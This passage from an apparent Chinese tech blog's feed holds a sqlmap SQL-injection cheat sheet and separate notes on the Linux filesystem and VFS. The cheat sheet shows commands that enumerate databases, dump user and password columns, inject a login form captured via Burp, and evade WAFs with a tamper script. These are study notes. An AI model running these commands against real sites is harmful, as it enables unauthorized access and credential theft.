class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# mysql注入(前提是mysql)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sqlmap -u url --dbs &lt;span class=&quot;comment&quot;&gt;# 找库&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sqlmap -u url -D dbname --table &lt;span class=&quot;comment&quot;&gt;# 找表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sqlmap -u url -D dataname -T table_name --columns &lt;span class=&quot;comment&quot;&gt;# 找列&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sqlmap -u url -D dataname -T table_name -c &lt;span class=&quot;string&quot;&gt;&amp;quot;id,user,password&amp;quot;&lt;/span&gt; --dump &lt;span class=&quot;comment&quot;&gt;# 获取字段的值(假如扫描出id,user,password字段)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# post登陆框注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 配置burp代理(127.0.0.1:8080)以拦截请求&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sqlmap -r search-test.txt -p tfUPass&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 请求延迟&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;--delay 1 --safe-freq&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 绕过WAF防火墙&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;--batch --tamper &lt;span class=&quot;string&quot;&gt;&amp;quot;space2morehash.py&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 使用注释符#(%23) 再就是使用随机的字符串和一个换行符(%0A)来替换空格&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 浏览器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;--random-agent&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;参数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;u url&lt;/li&gt;
&lt;li&gt;p parameter eg. &lt;code&gt;?id=&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;batch bat 批处理&lt;/li&gt;
&lt;li&gt;level&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;payload,5级包含的payload最多。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;http cookie在2级时可以检测&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HTTP user-Agent&amp;#x2F;Referer在3级时就会检测&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;注意url里要包括参数，不然报错&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; no parameter(s) found for testing in the provided data&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;在实际中我们发现，这样得到的IP地址有很多是没有响应的，如果对所有的地址进行扫描，会非常费时费力，我们要进行二次过滤，使用Python批量对地址进行请求， 过滤掉不响应或响应过慢的网页&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;requests.get(ip,timeout=6)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;</summary>
    
    
    
    <category term="Security" scheme="https://hejueyun.github.io/categories/Security/"/>
    
    
    <category term="sec" scheme="https://hejueyun.github.io/tags/sec/"/>
    
  </entry>
  
  <entry>
    <title>linux文件系统笔记</title>
    <link href="https://hejueyun.github.io/posts/2617683d/"/>
    <id>https://hejueyun.github.io/posts/2617683d/</id>
    <published>2020-09-11T15:17:52.000Z</published>
    <updated>2021-04-25T07:09:09.216Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>例如，read 函数调用可以从指定的文件描述符读取一定数量的字节。read 函数不了解文件系统的类型，比如 ext3 或 NFS。它也不了解文件系统所在的存储媒体，比如 AT Attachment Packet Interface（ATAPI）磁盘、Serial-Attached SCSI（SAS）磁盘或 Serial Advanced Technology Attachment（SATA）磁盘。但是，当通过调用 read 函数读取一个文件时，数据会正常返回</p></blockquote><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><blockquote><p>一个存储设备上的数据和元数据进行组织的机制</p><hr><p>元数据（Metadata），又称中介数据、中继数据，为描述数据的数据（data about data），主要是描述数据属性（property）的信息，用来支持如指示存储位置、历史数据、资源查找、文件记录等功能</p></blockquote><h3 id="挂装"><a href="#挂装" class="headerlink" title="挂装"></a>挂装</h3><blockquote><p>在 Linux 中将一个文件系统与一个存储设备关联起来的过程称为挂装（mount）。使用 mount 命令将一个文件系统附着到当前文件系统层次结构中（根）</p></blockquote><h3 id="用户态（用户空间）与内核态"><a href="#用户态（用户空间）与内核态" class="headerlink" title="用户态（用户空间）与内核态"></a>用户态（用户空间）与内核态</h3><img src="/posts/2617683d/2020-09-11-23-41-28.png" width height="250"><blockquote><p><strong>VFS 是底层文件系统的主要接口。这个组件导出一组接口，然后将它们抽象到各个文件系统</strong>，各个文件系统的行为可能差异很大。有两个针对文件系统对象的缓存（inode 和 dentry）</p><p>每个文件系统实现（比如 ext2、JFS 等等）导出一组通用接口，供 VFS 使用</p></blockquote><h3 id="虚拟文件系统层"><a href="#虚拟文件系统层" class="headerlink" title="虚拟文件系统层"></a>虚拟文件系统层</h3><blockquote><p>内核保存当前支持的文件系统的列表，可以通过 /proc 文件系统在用户空间中查看这个列表</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/filesystems</span><br><span class="line">nodev   sysfs</span><br><span class="line">nodev   rootfs</span><br><span class="line">nodev   bdev</span><br><span class="line">nodev   proc</span><br><span class="line">nodev   tmpfs</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>分类原则</p><ul><li>可分享的/不可分享的</li><li>可变动的/不变的</li></ul><p>根目录</p><blockquote><p>根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的， 同时根目录也与开机/还原/系统修复等动作有关。 由于系统开机时需要特定的开机软件、核心文件、开机所需程序、 函式库等等文件数据，若系统出现错误时，根目录也必须要包含有能够修复文件系统的程序才行。 因为根目录是这么的重要，所以在FHS的要求方面，他希望根目录不要放在非常大的分区， 因为越大的分区内你会放入越多的数据，如此一来根目录所在分区就可能会有较多发生错误的机会。</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.ibm.com/developerworks/cn/linux/l-linux-filesystem/index.html">Linux 文件系统剖析</a></li><li><a href="https://www.cnblogs.com/fengdejiyixx/p/10822012.html">Linux中的文件和目录结构详解 - 记忆流年 - 博客园</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;例如，read 函数调用可以从指定的文件描述符读取一定数量的字节。read 函数不了解文件系统的类型，比如 ext3 或 NFS。它也不了解文件系统所在的存储媒体，比如 AT Attachment Packet Interface（ATAPI）磁盘、Serial-Attached SCSI（SAS）磁盘或 Serial Advanced Technology Attachment（SATA）磁盘。但是，当通过调用 read 函数读取一个文件时，数据会正常返回&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h2&gt;&lt;h3 id=&quot;文件系统&quot;&gt;&lt;a href=&quot;#文件系统&quot; class=&quot;headerlink&quot; title=&quot;文件系统&quot;&gt;&lt;/a&gt;文件系统&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;一个存储设备上的数据和元数据进行组织的机制&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;元数据（Metadata），又称中介数据、中继数据，为描述数据的数据（data about data），主要是描述数据属性（property）的信息，用来支持如指示存储位置、历史数据、资源查找、文件记录等功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;挂装&quot;&gt;&lt;a href=&quot;#挂装&quot; class=&quot;headerlink&quot; title=&quot;挂装&quot;&gt;&lt;/a&gt;挂装&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;在 Linux 中将一个文件系统与一个存储设备关联起来的过程称为挂装（mount）。使用 mount 命令将一个文件系统附着到当前文件系统层次结构中（根）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;用户态（用户空间）与内核态&quot;&gt;&lt;a href=&quot;#用户态（用户空间）与内核态&quot; class=&quot;headerlink&quot; title=&quot;用户态（用户空间）与内核态&quot;&gt;&lt;/a&gt;用户态（用户空间）与内核态&lt;/h3&gt;&lt;img src=&quot;/posts/2617683d/2020-09-11-23-41-28.png&quot; width height=&quot;250&quot;&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;VFS 是底层文件系统的主要接口。这个组件导出一组接口，然后将它们抽象到各个文件系统&lt;/strong&gt;，各个文件系统的行为可能差异很大。有两个针对文件系统对象的缓存（inode 和 dentry）&lt;/p&gt;
&lt;p&gt;每个文件系统实现（比如 ext2、JFS 等等）导出一组通用接口，供 VFS 使用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;虚拟文件系统层&quot;&gt;&lt;a href=&quot;#虚拟文件系统层&quot; class=&quot;headerlink&quot; title=&quot;虚拟文件系统层&quot;&gt;&lt;/a&gt;虚拟文件系统层&lt;/h3&gt;</summary>
    
    
    
    <category term="Operating System" scheme="https://hejueyun.github.io/categories/Operating-System/"/>
    
    <category term="Linux" scheme="https://hejueyun.github.io/categories/Operating-System/Linux/"/>
    
    <category term="Notes" scheme="https://hejueyun.github.io/categories/Operating-System/Linux/Notes/"/>
    
    
  </entry>
  
</feed>
